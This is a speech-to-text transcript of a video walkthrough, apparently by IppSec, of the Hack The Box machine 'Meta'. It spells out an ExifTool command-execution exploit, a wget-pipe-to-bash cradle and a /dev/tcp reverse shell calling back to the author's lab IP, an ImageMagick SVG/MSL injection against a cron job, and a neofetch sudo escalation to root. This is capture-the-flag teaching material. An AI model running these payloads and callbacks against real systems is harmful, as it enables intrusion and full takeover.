 what's going on YouTube this is ipsag we're doing meta from hack to box and I really like this box because the story it builds by exploiting zip tool in two different ways and the second way to exploit it gets you more privileges but it's initially blocked off by the web application because there's an image upload and it only accepts jpegs and pngs and in order to exploit it the other way you need to be able to upload a SVG file thankfully the exif tool is vulnerable to a remote command execution so you can get a show as dub dub dub data and then you can drop a malicious SVG file in a directory which the application will convert to a PNG file I believe and initially you couldn't just upload that SVG file because the web server disallows it so it's really creative to once you get on the server to look at it and exploit it a different way because all the access controls are placed on the server so with that being said let's just jump in as always we start off with an end map so Dash SC for default Clips as we enumerate versions OA I'll put all formats playing the nmap director and call it meta and then the IP address which is 10 10 11.140 this can take some time to run so I've already ran it looking at the results we have just two ports open the first one being SSH on Port 22 and its Banner tells us it's a Debian box then we have HTTP on Port 80. it's running Apache and it's redirecting us to this domain artcorp.hdb so we could go over in Firefox and just verify this and we see we have a 404 page because we don't know what this DNS name is so let us edit our hairs file so zero V at C host and we can say 10 10 11 140 put in artquip.htb [Music] and then save this and when we refresh this page we have something so I'm just looking at this um there's a new product meta view we got some names Judy e Sarah W Thomas S so maybe I would be guessing like the username as Thomas S had something if there's a login form um there is a PHP developer so chances are this website or at least the meta view product is going to be PHP and looking at all these links I'm looking at the bottom left they go nowhere so we can try checking this page if it's a PHP so index.php doesn't return anything if we do HTML we get this page so let us um just run a go Buster and since this does point out a virtual host right away meaning I couldn't access it via the IP that's the first enumeration I'm going to begin with so go Buster V host um Dash U we'll call it artcorp.htb word list opt seclist Discovery DNS subdomain I'm going to do 5000 of the top 1 million and the other reason why I'm starting off with um oh shoot did I have it wrong hold on say artcorp.htb let's just copy and paste this screws something up I think I did I think I have a p there okay yeah typo but the re all the reason I'm starting with a virtual host enumeration scan because it goes much quicker there's not a lot of sub domains versus Pages if this was like index.php I may do enumeration there but this looks like static files like there's a few directories you could check like because uploads exist no it doesn't um robots.txt would have been found by nmap so really not sure what we'd find if we just do a bus that we do have a dev01.artcorp.htb so let's add this to a host file and we need to put a space there we go and when we go here we have the artcorp development environment and it links us to metaview and looking at this we have a file upload form so I'm going to click browse and let's create a file here so I'm going to touch index.html and let's upload this click upload and we get the file is empty so we can put something in here like please subscribe and see what happens so now when we browse we hit upload and it says file is not allowed only JPEG and PNG so let's move index.html to be index dot uh it was a JPG and just see if this uploads we're just playing with these error messages seeing what happens um still not allowed we can intercept this request in burp Suite see if there's anything else we could be changing so let's make sure my intercept is on click upload and we have index.jpg and content type image slash jpeg so I think everything is good here it's probably checking something like the mime type so let's just forward this request along and I'm going to do a locate Dash R I'm going to end with jpeg and just grab a file out of here um this xss or dot jpeg sure let's try this okay so now we have a Valor jpeg let's see exactly what this does if I click upload it looks like the output from exif Tool the other thing we probably should be checking is for like uploads if I check slash uploads I get nothing we can check meta view is on uploads here not found upload not found so I always want to have some Recon going in the background we have this dirtbuster finished so I'm just going to run ferrobuster and let this run while we check everything else out um actually I can probably do Dash X PHP because we know metaview is a PHP application if I just go index.php we find it so there we go that looks like it's going along so while this goes we did have this running exif tool right so I do this at least I assume it's acceptable if I run it locally we can see it's a lot of the same information um only enough we don't have the version number here it's not giving us everything right um did it give us megapixels at the bottom no so it's a truncated version of xeftool um say we do have a comment here so what I'm going to do is say exif tool Dash comment is equal to and let's put some PHP code so if I do this PHP Echo please subscribe and then end it like this we see the file has been updated so now if we look at the comment which was just xss ER if I run this again we have PHP syntax so now let's go and upload this and see exactly what happens so we upload and comment is blanked out so if I control U we look at it um it's just blanked out because it's HTML it's filtering out what's between these brackets so this does tell me it's cross-site scriptable so I bet if we did a comment we can do any HTML we want so we could try bold please subscribe then slash bold and upload this and what this would do would be allow us to attack the browser of people that are looking at this we can see Please Subscribe is in bold um from hindsight I know there's not another user viewing this page so there's nothing we can do here one of your testing application these are the types of things you want to look into I just noticed hey um this is an entity encoded so you should see like a and GT semicolon for greater than sign in and LT um less semicolon for less than since it wasn't encoding these brackets I knew we could do cross-site scripting there so let's try the next thing let's look if there's any vulnerabilities inside of exif tool so I'm just going to turn verpsweet off and then I can do exif tool um rce let's just look for this all right 2021 this looks like it could be potentially good and going through this let's see the exploit I just want like a GitHub page conclusion let's see here we go so here's a GitHub let's just get clone this CD CBE and let's see what is this exploit.pi doing it's putting a reverse shell in for us I don't know if I like this exploit because it's not exactly I know there's a better one um I'm going to look at it again let's go this one maybe okay this is a bit more um transparent at what's happening uh get clone like another one would have worked just run a python script and Bam but um sometimes I just like slowing down or looking at a different one so if we look at this um let's see what's the mime type of that we do this eval config and then pass a system command so let's look at what eval.config is and let's see encoded base Val so I'm guessing in this meta there is a um command execution thing because we have an eval here and I think this is where we're actually executing our code so if we just copy eval.config up One Directory that's the only file we need so we can do exif tool and then Dash config eval.config then the image name and then the variable so Dash eval system we can just do this so if we run this I'll go to metaville upload xsser we can see the ls has been outputted so now the next step let's just get a reverse shell um since we're in two different types of quotes right here I want to avoid any like special characters so that's why I'm not gonna do like bash Dash C bash Dash I because those type of payloads require these quotes and I just hate getting into the realm of escaping quotes because it's just it's it's annoying and hard to read so I'm going to do um curl 10 10 14 8. slash um index dot well we'll just call this shell Dot txt and then pipe it over to bash so let's go make the www and we could like base64 encode and do it that way you've seen me do it before like um Echo some base64 text there base64-d bash like that type of cradle would work perfectly fine here I just like changing it up every now and then and this is where I'm going to pipe it over from curl so let's do V show dot text Dash I Dev TCP 10 10 14 8 9001 zero and one and you'll notice a lot of times when I run this I do a bash Dash C first I don't have to do that because I know bash is going to be executing it because of this pipe so that's there let me just double check eyeball it that looks good python3 Dash M HTTP server let's listen on Port 80 run it with sudo run this and then we can re-upload this image and we don't have a hit and I didn't listen on Port 9001 but um it didn't hit our web server anyways so I'm going to try something real quick let's do a witch on curl to see if it exists on the system because a lot of times um curl may not exist on a system so that doesn't work and we can see it doesn't work there so let's try which wget and CFW get exist if none of these exist we're probably going to try like the base64 payload cradle but we have user bin W get so w git exist um so we can probably do the same payload except we swap out curl with wget and then Dash capital O this is going to be for like output file or output document I forget what it is and then just a dash which is standard out so if you didn't do this by default wget would download it to the disk this just says W get output it to standard out and then we pipe standard out to bash and this should get a sort of a shell so let's listen to 9001 go to xsser upload it's taking a long time which is a good indication that it worked and whenever something hangs like this I always like double checking to make sure I did not hang the web server we can still load pages because every now and then especially when doing like internal assessments something's running a non-threaded web server you get your reverse shell and then the box is just dead for everyone else which is never good and in those cases I would modify the payload to add like an ampersand or an and sign at the end of bash so it just goes and forks into the background but um that's besides the point so let's do python 3-c import PTY pty.spawn bam Bash like this awesome and then sdty raw minus Echo semicolon FG hit enter twice and now we have tab Auto completion and things like that if I want to clear it I always like doing export X term or export term is equal to X term and then we should do stty Dash a rows 26 columns 105. so I'm going to do stty rows 26 calls 105. and now we have a proper TTY if I didn't do that if I held a key then it would do some weird line wrapping um you always want to fix this and I always like giving myself a terminal so now that we're on this application let's see what happens there is an uploads directory So Meta view let's see um if I go here we're not on intercept uploads not found weird um touch T So upload slash T does exist okay so I guess directory indexing is not turned on because uploads we see not found but if I put a file that does exist on the server it is there so in the future when like looking for uploads directories of file uploads something you may want to check is just like go one layer deep into this directory um it doesn't really help us right now because the upload isn't here um let's do 4i and let's just see if we hit this quickly so um let's just send this so I'm going to hit upload then alt Tab and enter and we see the file does exist here it's it's PHP random name so we wouldn't have been able to how to like to Brute Force this anyways because um of these random characters I guess we could go Buster or something but it eventually gets deleted and I bet if you look in the code this is called a temporary file name that it uses to work with but let's see what else there is we have this composer.json and that's just going to tell us it runs exif tool um I guess we could have found this in a go Buster and figured out it was running exif tool this way because if we go to let's see meta view composer.json this is always a good file list the dependencies of a PHP app so that was a way we could have found the um vulnerability or at least identified something I don't see anything too interesting here there's no database so there's no password to grab if we go to verb dub dub dub devo1 artcorp.hdb we have this convert images directory and that is not being used anywhere so this is interesting um I'm gonna go up one I'm going to grab Dash R convert images see if it exists anywhere here it doesn't um I was thinking like this could have been a way to bypass the mime type check of the application because um the web app only allows us to upload jpegs right and then it passes it over to exiftool somehow we could view the web code to see exactly how but it passes to exf2 so I was thinking huh maybe it puts the image and convert images and then um use that exif tool wrap it to just do anything on that convert images directory so if we can write to this convert images directory we could potentially bypass any type of check so I'm going to do a touch test and we can indeed write to this directory I guess we don't have to remove the file um be handy to see if anything happens to this file eventually uh the other thing we could do is see if anything on this box actually uses it so I'm going to grep dash R convert images on slash and I'm going to pipe errors to null right and right away we see there is a file um user local bin convert images.sh and it's running mogrify also out of user local bin and this is interesting because user like an in Linux when the path has local that means it's not going to be managed by the package manager it's a local thing the user did so um when you see files there always check like their versions because it could be out of date so I'm going to look at mography just run this I'm going to add Dash V because that's normally the version flag and that is not the version flag Dash capital V uh just do no arguments and let's go to the top and this has a lot of options wow uh let's see license mogrify so we can see it's running a version from 2021 oddly enough that copyright Is 2020 but um we have an old version of image magic being used from mogify so let's Google for like image magic vulnerabilities I know there's um image tragic but that was like 2016 I want to say so I'm just going to Google image magic rce see what we have um ignoring this image tragic well we have a take two so let's see when this was is there cve well um 2018 so I'm not going to care about that um let's add 2021 to the search Google told us we wanted to um so we have this tweet let's see exif tool that doesn't look like it's linking to anything helpful image tragic let's see what we do 2020 is there anything here a command injection let's see what this is verse sec is this going to be the same thing image Magic Shell injection via PDF this looks like it is different and it's talking a lot about the exploit I'm looking for a payload encrypted PDFs MSL and polygots and let's see prc.svg so this is going to be probably what we want to test with um I'm just going to put something in this we see I did another LS the file is deleted that was here I'm going to call this poem.svg right yep and then paste this in and since something's deleting files out of here I'm just going to change this to be temp owned and then let's um cat user local bin what was it um convert images right yep and I'm going to copy everything up to the to devnol because I don't want to hide error messages right so if I execute this we see it's unable to open poc.svg so um if I look at temp it's gone well temp nothing is there the files still exists and it was still looking for POC dot SVG so I guess we have to link it here since we changed the name let's do pone.svg here and then rerun this we just get a permission denied which is fine um we don't have a real error message if I look at temp we see owned and of course it's going to be dub dub data because that is who our user is so oh that got deleted so pound.spg uh let's copy this again is that not copy copy let's do Ctrl shift insert there we go so I'm gonna call this one uh shoot pound two because I want to see what this user is right and this is pound and we want to change this to temp so now if something runs on a cron and executes this parent.svg entered right to um slash temp right and now let's just copy this to [Music] um I'll just call it poc.svg and before we forget let's just change the MSL because this is going to be where reverse shell is so we can just looks like execute any code here right between these two back ticks so we already have the Cradle so wget Dash capital O zero 10 10 14 8 Shell dot txt is that what I think I called it so let's go back here V and we can see only enough this didn't even find the um meta view but um let's see cdwb shell.txt sudo python3 Dash M hdb server 80. we're listening I should do nclvmp 9001 so we can catch a shell and then we save this if we look at temp nothing's written yet so I don't think anything's happened maybe it'll happen on the next minute both these files exist temp yes so what I'm going to do look at date I'm gonna sleep for 40 seconds actually date sleep for 25 seconds because I want to catch this live and we're going to do some Eddie magic to skip this time okay 25 seconds has passed if I do it LS we see the files are still there let's do psef convert see if we can find anything um we missed it on the PS I bet if we ran a program like piece by we would have seen it but a directory is empty if we look at temp we do see oh prone 2 did not get written so maybe I screwed up that payload and we don't have anything um that was bizarre so we completely screwed up let's do poon dot SVG we will copy this paste and let's try this again so I'm going to do W get 10 10 14 8. Bash we have to put it to standard out and this is parent.svg okay then I'm going to kill these so we can do it all on this pane real quick so cdwb pseudo python3-am HP server 80 and clvnp 9001 okay looking at the date um we have some time I think before a cron could run I want to test this out and I've ran a lot of commands on this box there we go um we got a hit but when I get a shell which is weird wget Dash o we need to shell.txt run this and yeah we do get a shell so that should work there we go um it must have been a new minute yeah and we got this so um I'm not sure what we screwed up the first time but there we have it working um we should do the python 3-c import PTY PTY spawn fixer terminal actually let's not do it and see if we run into an error message so um we can do Studio Dash L and we can see the user Thomas may run the following command on meta user bin Neo Fetch and then two quotes so we can't pass any arguments to neofetch uh we do near fetch I actually guessed maybe this just prints like the banner um I don't know what neo-fetch is but it's printing something I'm guessing it's just the like SSH band when you log in because I've seen something like this um Neo fetch Dash h a Neo fetch Dash h uh not sure but let's do a GF GTFO bin and see if there's any ways we can get this to execute commands so neofetch sudo so it looks like we can execute Neo Fetch with a config but um we can't do this because um we can't pass any arguments to neo-fetch so let's look at that sudo again and we can see the environment keep xdg config home so this environment variable is going to persist through pseudo normally when you do a pseudo um your environment gets reset with this end reset so you can't do any of these types of hijacks so what I'm guessing is we can set the near fetch config to our home directory and then put this exact line in it and get command execution so let's try this real quick home do lsla it's probably n config and then we have this Neo fetch directory and we have config so this looks good um if I let's see before we do this because there's probably gonna be a crown that reverts this config or something I want to Echo xdg config home and this is blank I can also do EnV to look at all my environment variables so I'm going to do export xdg config home is equal to home Thomas dot config I believe if this doesn't work then I'm going to try changing it up up One Directory so it's just home Thomas so now if I type EnV we do have this so l we want to run that command after this so I'm going to Echo this into was it config.config or config.conf I think yep and then if I do the sudo and execute this ID oh we have root so we didn't even have to run into any issues with um not sending a terminal correctly but if I control C or do things like that then I lose the terminal which just sucks so that's why I always like doing the python3-c import PTY pty.spawn been Bash and then sdty raw minus Echo FG so now if I control seed I wouldn't lose my shell but um window root on the box we can get root dot text and hope you enjoyed this video so take care and I will see you all next time